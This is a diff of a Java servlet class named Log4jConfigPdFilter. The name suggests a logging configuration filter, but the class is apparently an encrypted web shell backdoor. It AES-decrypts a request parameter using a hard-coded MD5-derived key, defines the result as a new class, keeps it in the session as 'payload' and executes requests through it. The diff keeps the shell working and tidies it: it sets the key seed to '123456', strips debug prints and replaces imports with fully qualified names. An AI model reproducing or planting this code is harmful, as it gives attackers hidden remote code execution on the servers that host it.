@@ -1,19 +1,8 @@
 package com.filter;
 
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
-import java.io.ByteArrayOutputStream;
-import java.math.BigInteger;
-import java.security.MessageDigest;
-import java.util.Map;
-import java.util.concurrent.ConcurrentHashMap;
-
 public class Log4jConfigPdFilter extends ClassLoader{
 
-    private static final Map<ClassLoader, Log4jConfigPdFilter> CACHE = new ConcurrentHashMap<>();
+    private static final java.util.Map<ClassLoader, Log4jConfigPdFilter> CACHE = new java.util.concurrent.ConcurrentHashMap<>();
 
     public static Log4jConfigPdFilter getInstance(ClassLoader loader) {
         return CACHE.computeIfAbsent(loader, k -> new Log4jConfigPdFilter());
@@ -21,9 +10,7 @@ public class Log4jConfigPdFilter extends ClassLoader{
 
     public static String md5;
     static String pass = "pass";
-    // key 的实际值需要md5之后，截取前16位，详细见x()解密函数
-//    static String key = "8cf02d45e78e88a4";
-    static String key = md5("Anbjntgvpph").substring(0, 16).toLowerCase();
+    static String key = md5("123456").substring(0, 16).toLowerCase();
 
     public Log4jConfigPdFilter() {
     }
@@ -37,8 +24,8 @@ public class Log4jConfigPdFilter extends ClassLoader{
 
     public byte[] x(byte[] s, boolean m) {
         try {
-            Cipher c = Cipher.getInstance("AES");
-            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
+            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
+            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
             return c.doFinal(s);
         } catch (Exception var4) {
             return null;
@@ -49,9 +36,9 @@ public class Log4jConfigPdFilter extends ClassLoader{
         String ret = null;
 
         try {
-            MessageDigest m = MessageDigest.getInstance("MD5");
+            java.security.MessageDigest m = java.security.MessageDigest.getInstance("MD5");
             m.update(s.getBytes(), 0, s.length());
-            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
+            ret = (new java.math.BigInteger(1, m.digest())).toString(16).toUpperCase();
         } catch (Exception var3) {
         }
 
@@ -82,18 +69,16 @@ public class Log4jConfigPdFilter extends ClassLoader{
         return super.defineClass(cb, 0, cb.length);
     }
 
-    public void execute(HttpServletRequest request, HttpServletResponse response) {
-        System.out.println("into com.filter.Log4jConfigPdFilter.execute()");
-        System.out.println("key = " + key);
+    public void execute(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) {
         try {
-            HttpSession session = request.getSession();
+            javax.servlet.http.HttpSession session = request.getSession();
             byte[] data = this.base64Decode(request.getParameter(pass));
             data = this.x(data, false);
             if (session.getAttribute("payload") == null) {
                 session.setAttribute("payload", (new Log4jConfigPdFilter(this.getClass().getClassLoader())).Q(data));
             } else {
                 request.setAttribute("parameters", data);
-                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
+                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
 
                 Object f;
                 try {
